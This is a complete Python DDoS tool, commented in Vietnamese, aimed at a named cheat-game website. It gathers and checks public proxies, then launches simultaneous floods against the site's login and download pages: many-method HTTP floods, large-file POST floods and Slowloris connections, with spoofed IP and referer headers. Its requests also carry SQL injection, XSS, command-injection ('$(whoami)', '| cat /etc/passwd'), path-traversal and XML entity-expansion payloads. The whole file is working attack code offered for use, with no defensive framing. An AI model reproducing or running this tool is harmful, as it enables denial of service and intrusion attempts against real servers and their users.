# -*- coding: utf-8 -*-
# TOOL DDoS SIÊU MẠNH v5.0 – 60+ METHODS CHẠY CÙNG LÚC – ĐA LUỒNG VÔ HẠN
# Mỗi method có riêng một luồng (hoặc pool luồng) tấn công liên tục
# Tự động quét proxy, lưu khi Ctrl+C, tương thích Python 3.8+
import requests
import threading
import time
import random
import socket
import ssl
import sys
import os
import re
import signal
import urllib3
import string
import hashlib
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlencode
import warnings
warnings.filterwarnings('ignore')
urllib3.disable_warnings()

# ============================================
# CẤU HÌNH CHUNG
# ============================================
TARGET_HOST = "www.t4xcheatgamer.x10.mx"
TARGET_PORT = 443

TARGET_URLS = [
    "https://www.t4xcheatgamer.x10.mx/dll_download.php",
    "https://www.t4xcheatgamer.x10.mx/login.php",
    "https://www.t4xcheatgamer.x10.mx/dll_status.php",
]

TARGET_PATHS = [
    "/dll_download.php","/login.php","/dll_status.php","/index.php","/download.php",
    "/files/","/wp-admin/","/admin/","/wp-login.php","/api/","/upload.php",
    "/config.php","/backup/","/wp-content/","/wp-includes/","/xmlrpc.php",
    "/wp-json/","/.env","/.git/config","/phpinfo.php","/info.php","/test.php",
    "/status.php","/server-status","/server-info",
]

PROXY_FILE = "proxies_raw.txt"
PROXY_LIVE_FILE = "proxies_live.txt"
current_proxy_manager = None

PROXY_SOURCES = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://spys.me/proxy.txt",
    "https://free-proxy-list.net/",
    "https://www.sslproxies.org/",
    "https://www.us-proxy.org/",
    "https://www.socks-proxy.net/",
]
PROXY_CHECK_TIMEOUT = 3
PROXY_CHECK_THREADS = 300
MAX_RETRIES = 1
SAVE_INTERVAL = 500
TEST_URLS = ["http://httpbin.org/ip", "https://api.ipify.org?format=json", "http://ip-api.com/json/"]

# ============================================
# DANH SÁCH 60+ HTTP METHODS
# ============================================
HTTP_METHODS = [
    "GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH", "TRACE", "CONNECT",
    "PURGE", "DEBUG", "TRACK", "LOCK", "UNLOCK", "PROPFIND", "PROPPATCH", "MKCOL",
    "COPY", "MOVE", "SEARCH", "BIND", "UNBIND", "REBIND", "LABEL", "LINK", "UNLINK",
    "MERGE", "BASELINE", "CHECKIN", "CHECKOUT", "UNCHECKOUT", "VERSION-CONTROL",
    "REPORT", "UPDATE", "REDIRECT", "FOOBAR", "RANDOM123", "NULL", "FAKE",
    "MKCALENDAR", "ACL", "PROXY-AUTHENTICATE", "ORDERPATCH", "UPDATEREDIRECTREF",
    "PRI", "PRIORITY", "REFRESH", "SET", "RESET", "FLUSH", "SYN", "RESTORE",
    "DESCRIBE", "SHOW", "OPEN", "CLOSE", "FETCH", "PUBLISH", "SUBSCRIBE",
    "UNSUBSCRIBE", "NOTIFY", "BATCH", "INVOKE", "CALL",
    # thêm vài method tự tạo
    "X-ATTACK-1", "X-ATTACK-2", "X-ATTACK-3"
]
# Đảm bảo có ít nhất 60
assert len(HTTP_METHODS) >= 60, "Cần ít nhất 60 methods"

CONTENT_TYPES = [
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "application/json",
    "application/xml",
    "text/xml",
    "text/plain",
    "text/html",
    "application/octet-stream",
    "application/x-httpd-php",
    "application/pdf",
    "image/jpeg","image/png","image/gif","video/mp4","audio/mpeg",
    "application/zip","application/gzip","application/x-tar",
    "application/x-7z-compressed","application/x-rar-compressed",
    "application/x-shockwave-flash",
    "application/vnd.ms-excel","application/vnd.ms-powerpoint","application/msword",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/java-archive","application/x-msdownload",
    "application/x-python-code","application/x-perl","application/x-ruby",
    "application/x-php","application/x-javascript","text/css","text/csv",
    "application/x-yaml",
    "application/x-www-form-urlencoded; charset=UTF-8",
    "multipart/form-data; boundary=----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
    "application/json; charset=UTF-8",
    "application/xml; charset=UTF-8",
]

QUERY_PARAMS_POOL = [
    "download","file_id","id","action","mode","type","token","key","hash",
    "checksum","version","user","pass","username","password","login","email",
    "admin","root","debug","test","page","sort","order","limit","offset",
    "search","q","query","cmd","exec","command","shell","eval","include",
    "require","file","path","dir","folder","url","redirect","return","next",
    "callback","jsonp","format","output","api_key","apikey","auth","session",
    "cookie","csrf","nonce","timestamp","time","date","rand","random",
    "s","p","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","r","t","u","v","w","x","y","z",
]

PAYLOADS = [
    "' OR '1'='1","' OR 1=1--","admin'--","1' OR '1'='1'--",
    "1; DROP TABLE users--","' UNION SELECT * FROM users--",
    "1 AND 1=1","1 AND 1=2","' OR 'x'='x",
    "<script>alert(1)</script>","<img src=x onerror=alert(1)>",
    "javascript:alert(1)","<svg/onload=alert(1)>",
    "; ls -la","| cat /etc/passwd","`id`","$(whoami)",
    "../../../etc/passwd","..\\..\\..\\windows\\system32",
    ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(50,500))),
    ''.join(random.choices(string.printable, k=random.randint(100,1000))),
    "\x00" * random.randint(100,1000),
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">]><lolz>&lol2;</lolz>',
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
    "curl/7.68.0","Wget/1.20.3 (linux-gnu)","python-requests/2.28.0",
]

REFERERS = [
    "https://www.google.com/search?q=cheat+game+download",
    "https://www.bing.com/search?q=free+game+cheats",
    "https://www.reddit.com/r/cheats/",
    "https://www.youtube.com/watch?v=cheat_tutorial",
    "https://www.facebook.com/groups/gamecheats/",
    "https://discord.com/channels/gamecheats/",
    "https://t.me/gamecheats",
    "https://github.com/gamecheats/",
    "https://www.twitch.tv/cheatstream",
    "https://twitter.com/cheatgamer",
    "https://www.instagram.com/cheatgamer/",
    "https://duckduckgo.com/?q=cheat+download",
    "https://search.yahoo.com/search?p=cheat",
    "",
    "https://www.t4xcheatgamer.x10.mx/",
]

# ============================================
# HÀM XỬ LÝ CTRL+C
# ============================================
def signal_handler(signum, frame):
    global current_proxy_manager
    print("\n\n[!] CTRL+C - ĐANG LƯU PROXY LIVE...")
    if current_proxy_manager and current_proxy_manager.live_proxies:
        try:
            with open(PROXY_LIVE_FILE, "w") as f:
                for proxy in current_proxy_manager.live_proxies:
                    f.write(proxy + "\n")
            print(f"[+] Đã lưu {len(current_proxy_manager.live_proxies)} proxy vào {PROXY_LIVE_FILE}")
        except Exception as e:
            print(f"[-] Lỗi lưu file: {e}")
    print("[!] Thoát.\n")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# QUẢN LÝ PROXY
# ============================================
class ProxyManager:
    def __init__(self):
        self.live_proxies = []
        self.lock = threading.Lock()
        self.total_scanned = 0
        self.total_live = 0

    def fetch_proxies_from_source(self, url):
        proxies = []
        try:
            resp = requests.get(url, timeout=30, headers={"User-Agent": random.choice(USER_AGENTS)})
            content = resp.text
            ip_port_pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}:\d{2,5}\b')
            matches = ip_port_pattern.findall(content)
            for m in matches: proxies.append(m.strip())
            print(f"[+] {url}: tìm thấy {len(matches)} proxy")
        except: pass
        return proxies

    def scan_all_sources(self):
        print("\n[*] Quét proxy từ các nguồn...")
        all_proxies = set()
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.fetch_proxies_from_source, url): url for url in PROXY_SOURCES}
            for future in as_completed(futures):
                all_proxies.update(future.result())
        with open(PROXY_FILE, "w") as f:
            for p in all_proxies: f.write(p + "\n")
        print(f"[+] Tổng {len(all_proxies)} proxy thô -> {PROXY_FILE}")
        return list(all_proxies)

    def check_proxy(self, proxy):
        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        for test_url in TEST_URLS:
            for _ in range(MAX_RETRIES):
                try:
                    r = requests.get(test_url, proxies=proxy_dict, timeout=PROXY_CHECK_TIMEOUT,
                                     headers={"User-Agent": random.choice(USER_AGENTS)}, verify=False)
                    if r.status_code == 200: return True, proxy
                except: continue
        return False, proxy

    def check_all_proxies(self, proxy_list):
        global current_proxy_manager
        current_proxy_manager = self
        print(f"\n[*] Kiểm tra {len(proxy_list)} proxy live...")
        live = []
        self.total_scanned = len(proxy_list)
        checked = 0
        with ThreadPoolExecutor(max_workers=PROXY_CHECK_THREADS) as executor:
            futures = {executor.submit(self.check_proxy, p): p for p in proxy_list}
            for future in as_completed(futures):
                try:
                    ok, p = future.result(timeout=PROXY_CHECK_TIMEOUT+2)
                except: ok, p = False, ""
                checked += 1
                if ok: live.append(p); self.total_live += 1
                if checked % 500 == 0:
                    print(f"\r[*] Tiến độ: {checked}/{self.total_scanned} | Live: {self.total_live}", end="")
                if checked % SAVE_INTERVAL == 0:
                    with open(PROXY_LIVE_FILE, "w") as f:
                        for p_ in live: f.write(p_ + "\n")
        with open(PROXY_LIVE_FILE, "w") as f:
            for p in live: f.write(p + "\n")
        self.live_proxies = live
        print(f"\n[+] Đã kiểm tra xong: {len(live)} proxy live -> {PROXY_LIVE_FILE}")
        return live

    def get_random_proxy(self):
        if not self.live_proxies: return None
        p = random.choice(self.live_proxies)
        return {"http": f"http://{p}", "https": f"http://{p}"}

    def reload_live_proxies(self):
        if os.path.exists(PROXY_LIVE_FILE):
            with open(PROXY_LIVE_FILE, "r") as f:
                self.live_proxies = [line.strip() for line in f if line.strip()]
            print(f"[+] Tải {len(self.live_proxies)} proxy live từ file")
            return self.live_proxies
        return []

# ============================================
# HÀM SINH DỮ LIỆU NGẪU NHIÊN
# ============================================
def generate_random_url():
    base = random.choice(TARGET_URLS)
    if random.random() < 0.3:
        base = f"https://{TARGET_HOST}{random.choice(TARGET_PATHS)}"
    params = {}
    for _ in range(random.randint(1, 15)):
        k = random.choice(QUERY_PARAMS_POOL)
        v = random.choice(PAYLOADS) if random.random() < 0.2 else ''.join(random.choices(string.ascii_letters+string.digits, k=random.randint(1,100)))
        params[k] = v
    if params: base += "?" + urlencode(params)
    if random.random() < 0.1: base += "#" + ''.join(random.choices(string.ascii_letters, k=random.randint(5,50)))
    return base

def generate_random_headers():
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": random.choice(["text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                                 "application/json,text/html,*/*","*/*"]),
        "Accept-Language": random.choice(["en-US,en;q=0.9","vi-VN,vi;q=0.9,en;q=0.8","*"]),
        "Accept-Encoding": random.choice(["gzip, deflate, br","identity"]),
        "Referer": random.choice(REFERERS),
        "Connection": random.choice(["keep-alive","close"]),
        "Cache-Control": random.choice(["no-cache","max-age=0"]),
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Content-Type": random.choice(CONTENT_TYPES),
        "Origin": f"https://{TARGET_HOST}",
    }
    for _ in range(random.randint(0,5)):
        key = f"X-Random-{random.randint(1,99999)}"
        headers[key] = os.urandom(random.randint(100,2000)).hex()
    return headers

def generate_random_body():
    t = random.choice(["urlencoded","json","xml","raw","empty"])
    if t == "urlencoded":
        params = {random.choice(QUERY_PARAMS_POOL): random.choice(PAYLOADS) for _ in range(random.randint(1,10))}
        return urlencode(params)
    elif t == "json":
        return json.dumps({random.choice(QUERY_PARAMS_POOL): random.choice(PAYLOADS) for _ in range(random.randint(1,10))})
    elif t == "xml":
        return '<?xml version="1.0"?><root>' + ''.join([f'<{random.choice(QUERY_PARAMS_POOL)}>{random.choice(PAYLOADS)}</{random.choice(QUERY_PARAMS_POOL)}>' for _ in range(random.randint(1,10))]) + '</root>'
    elif t == "raw":
        return os.urandom(random.randint(1024, 1024*1024))  # 1KB - 1MB
    return None

# ============================================
# LỚP TẤN CÔNG PHƯƠNG PHÁP CỐ ĐỊNH (60+ methods riêng biệt)
# ============================================
class MethodFlood:
    """Mỗi method có một pool luồng riêng, gửi request vô hạn với method đó."""
    def __init__(self, proxy_manager, methods=HTTP_METHODS, threads_per_method=10):
        self.pm = proxy_manager
        self.methods = methods
        self.threads_per_method = threads_per_method
        self.running = False
        self.lock = threading.Lock()
        self.total_requests = 0
        self.success = 0

    def attack_with_method(self, method):
        session = requests.Session()
        req_id = 0
        while self.running:
            try:
                proxy = self.pm.get_random_proxy() if req_id % 5 == 0 else None
                url = generate_random_url()
                headers = generate_random_headers()
                body = generate_random_body() if method in ["POST","PUT","PATCH","DELETE","SEARCH"] else None
                if method in ["GET","HEAD","OPTIONS","DELETE","TRACE"]:
                    r = session.request(method, url, headers=headers, proxies=proxy, timeout=30, verify=False, stream=True)
                else:
                    r = session.request(method, url, headers=headers, data=body, proxies=proxy, timeout=30, verify=False, stream=True)
                try:
                    _ = r.content[:4096]
                except: pass
                with self.lock:
                    self.total_requests += 1
                    self.success += 1
                    if self.total_requests % 1000 == 0:
                        print(f"\r[*] MethodFlood ({method}): {self.total_requests} req | Success: {self.success} | Proxies: {len(self.pm.live_proxies)}", end="")
            except:
                with self.lock: self.total_requests += 1
            req_id += 1

    def start(self):
        self.running = True
        print(f"\n[*] Khởi động MethodFlood: {len(self.methods)} methods, mỗi method {self.threads_per_method} luồng")
        threads = []
        for method in self.methods:
            for _ in range(self.threads_per_method):
                t = threading.Thread(target=self.attack_with_method, args=(method,))
                t.daemon = True
                t.start()
                threads.append(t)
                time.sleep(0.005)  # giảm sốc
        return threads

    def stop(self):
        self.running = False

# ============================================
# CÁC LỚP TẤN CÔNG BỔ SUNG (giữ lại như cũ)
# ============================================
class HTTPFlood:
    # (giống code cũ, có thể giảm luồng nếu cần)
    def __init__(self, proxy_manager):
        self.pm = proxy_manager
        self.running = False
        self.count = 0
        self.lock = threading.Lock()
    def send_request(self, tid):
        session = requests.Session()
        c = 0
        while self.running:
            try:
                proxy = self.pm.get_random_proxy() if c % 5 == 0 else None
                url = random.choice(TARGET_URLS) + f"?download=true&file_id={random.randint(1,9999999)}"
                headers = {"User-Agent": random.choice(USER_AGENTS)}
                r = session.get(url, headers=headers, proxies=proxy, timeout=30, verify=False, stream=True)
                _ = r.content[:4096]
                with self.lock: self.count += 1
                if self.count % 1000 == 0:
                    print(f"\r[*] HTTP GET Flood: {self.count} req", end="")
            except: pass
            c += 1
    def start(self, threads=1000):
        self.running = True
        print(f"[*] HTTP GET Flood: {threads} luồng")
        ts = []
        for i in range(threads):
            t = threading.Thread(target=self.send_request, args=(i,))
            t.daemon = True
            t.start()
            ts.append(t)
        return ts
    def stop(self): self.running = False

class PostFlood:
    # (giống cũ)
    def __init__(self, proxy_manager):
        self.pm = proxy_manager
        self.running = False
        self.count = 0
        self.lock = threading.Lock()
    def send_post(self, tid):
        while self.running:
            try:
                proxy = self.pm.get_random_proxy()
                target = random.choice(TARGET_URLS)
                fake_file = os.urandom(random.randint(1024*500, 1024*1024*2))
                files = {"file": (f"cheat_{random.randint(1,99999)}.dll", fake_file, "application/x-msdownload")}
                data = {random.choice(QUERY_PARAMS_POOL): random.choice(PAYLOADS) for _ in range(random.randint(1,5))}
                requests.post(target, files=files, data=data, proxies=proxy, timeout=30, verify=False)
                with self.lock: self.count += 1
                if self.count % 500 == 0:
                    print(f"\r[*] POST Flood: {self.count} uploads", end="")
            except: pass
    def start(self, threads=500):
        self.running = True
        print(f"[*] POST Flood: {threads} luồng")
        ts = []
        for i in range(threads):
            t = threading.Thread(target=self.send_post, args=(i,))
            t.daemon = True
            t.start()
            ts.append(t)
        return ts
    def stop(self): self.running = False

class Slowloris:
    # (giữ nguyên)
    def __init__(self):
        self.sockets = []
        self.running = False
    def create_socket(self):
        path = random.choice(TARGET_PATHS)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ssl_sock = ctx.wrap_socket(sock, server_hostname=TARGET_HOST)
            ssl_sock.connect((TARGET_HOST, TARGET_PORT))
            req = f"GET {path} HTTP/1.1\r\nHost: {TARGET_HOST}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\nConnection: keep-alive\r\nX-Random: {os.urandom(500).hex()}\r\n"
            ssl_sock.send(req.encode())
            return ssl_sock
        except: return None
    def maintain(self, tid):
        socks = []
        for _ in range(30):
            s = self.create_socket()
            if s: socks.append(s)
        self.sockets.extend(socks)
        while self.running:
            for i, s in enumerate(socks):
                try:
                    s.send(f"X-Keep: {os.urandom(100).hex()}\r\n".encode())
                    time.sleep(random.uniform(5,15))
                except:
                    try: s.close()
                    except: pass
                    new_s = self.create_socket()
                    if new_s: socks[i] = new_s
    def start(self, threads=300):
        self.running = True
        print(f"[*] Slowloris: {threads} luồng")
        ts = []
        for i in range(threads):
            t = threading.Thread(target=self.maintain, args=(i,))
            t.daemon = True
            t.start()
            ts.append(t)
        return ts
    def stop(self):
        self.running = False
        for s in self.sockets:
            try: s.close()
            except: pass
        self.sockets.clear()

# ============================================
# MENU CHÍNH
# ============================================
def print_banner():
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║  ██╗   ██╗██╗  ████████╗██████╗  █████╗     ██████╗ ██████╗  ║
    ║  ██║   ██║██║  ╚══██╔══╝██╔══██╗██╔══██╗    ██╔══██╗██╔══██╗ ║
    ║  ██║   ██║██║     ██║   ██████╔╝███████║    ██║  ██║██║  ██║ ║
    ║  ██║   ██║██║     ██║   ██╔══██╗██╔══██║    ██║  ██║██║  ██║ ║
    ║  ╚██████╔╝███████╗██║   ██║  ██║██║  ██║    ██████╔╝██████╔╝ ║
    ║   ╚═════╝ ╚══════╝╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═════╝  ║
    ║         PHIÊN BẢN 5.0 – 60+ METHODS CHẠY CÙNG LÚC           ║
    ╚══════════════════════════════════════════════════════════════╝
    """)

def main_menu():
    global current_proxy_manager
    pm = ProxyManager()
    current_proxy_manager = pm

    method_flood = None
    http_flood = None
    post_flood = None
    slowloris = None

    while True:
        print("\n" + "="*60)
        print("            MENU CHÍNH - DDoS TOOL 5.0")
        print("="*60)
        print("[1] Quét proxy từ các nguồn online")
        print("[2] Kiểm tra proxy live từ file proxies_raw.txt")
        print("[3] Quét + Kiểm tra proxy (tự động)")
        print("[4] Xem danh sách proxy live hiện tại")
        print("[5] BẮT ĐẦU TẤN CÔNG TỔNG LỰC (60+ methods đồng thời + bổ sung)")
        print("[6] DỪNG TẤT CẢ CUỘC TẤN CÔNG")
        print("[7] Thoát")
        print("="*60)
        choice = input("[?] Chọn (1-7): ").strip()

        if choice == "1":
            pm.scan_all_sources()
        elif choice == "2":
            if os.path.exists(PROXY_FILE):
                with open(PROXY_FILE,"r") as f:
                    proxies = [l.strip() for l in f if l.strip()]
                print(f"[+] Đã tải {len(proxies)} proxy từ file")
                pm.check_all_proxies(proxies)
            else:
                print(f"[-] File {PROXY_FILE} không tồn tại. Hãy quét trước (chọn 1)")
        elif choice == "3":
            proxies = pm.scan_all_sources()
            pm.check_all_proxies(proxies)
        elif choice == "4":
            live = pm.reload_live_proxies()
            print(f"[+] Tổng proxy live: {len(live)}")
            if live:
                print("    Mẫu:", live[:5])
        elif choice == "5":
            live = pm.reload_live_proxies()
            if not live:
                print("[-] KHÔNG CÓ PROXY LIVE! Hãy quét và kiểm tra proxy trước (chọn 3).")
                continue
            print(f"[+] Sẵn sàng tấn công với {len(live)} proxy")
            confirm = input("Bắt đầu siêu tấn công? (y/n): ").strip().lower()
            if confirm == "y":
                # Dừng các cuộc cũ nếu có
                if method_flood: method_flood.stop()
                if http_flood: http_flood.stop()
                if post_flood: post_flood.stop()
                if slowloris: slowloris.stop()

                # Khởi động MethodFlood với 60+ methods, mỗi method 10 luồng
                method_flood = MethodFlood(pm, methods=HTTP_METHODS, threads_per_method=10)
                method_flood.start()

                # Khởi động thêm HTTP GET flood, POST flood, Slowloris với số luồng giảm
                http_flood = HTTPFlood(pm)
                http_flood.start(threads=1000)
                post_flood = PostFlood(pm)
                post_flood.start(threads=500)
                slowloris = Slowloris()
                slowloris.start(threads=300)

                print("\n[!] ĐANG SIÊU TẤN CÔNG TỔNG LỰC... Nhấn Enter để dừng")
                input()
                # Dừng khi Enter
                if method_flood: method_flood.stop()
                if http_flood: http_flood.stop()
                if post_flood: post_flood.stop()
                if slowloris: slowloris.stop()
                print("[!] Đã dừng tất cả.")
        elif choice == "6":
            if method_flood: method_flood.stop()
            if http_flood: http_flood.stop()
            if post_flood: post_flood.stop()
            if slowloris: slowloris.stop()
            print("[!] Đã dừng tất cả cuộc tấn công.")
        elif choice == "7":
            if pm.live_proxies:
                with open(PROXY_LIVE_FILE,"w") as f:
                    for p in pm.live_proxies: f.write(p+"\n")
                print(f"[+] Đã lưu proxy vào {PROXY_LIVE_FILE}")
            print("[!] Thoát.")
            sys.exit(0)
        else:
            print("[-] Lựa chọn không hợp lệ.")

if __name__ == "__main__":
    print_banner()
    main_menu()
